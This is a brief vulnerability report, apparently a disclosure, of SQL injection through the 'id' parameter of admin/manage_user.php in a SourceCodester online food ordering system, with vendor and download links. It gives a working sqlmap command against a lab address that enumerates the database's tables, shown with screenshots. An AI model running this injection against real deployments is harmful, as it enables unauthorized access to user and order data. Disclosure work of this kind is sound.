vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/212478563-258363e0-0666-45bc-b80b-de23e2fd1ebe.png)
sqlmap.py -u "http://192.168.249.88/php-fos-db/admin/manage_user.php?id=1" -D fos_db --tables
![image](https://user-images.githubusercontent.com/30823782/212478593-f71cbe6e-37bb-4c2d-8a95-26e1ce7d72f8.png)

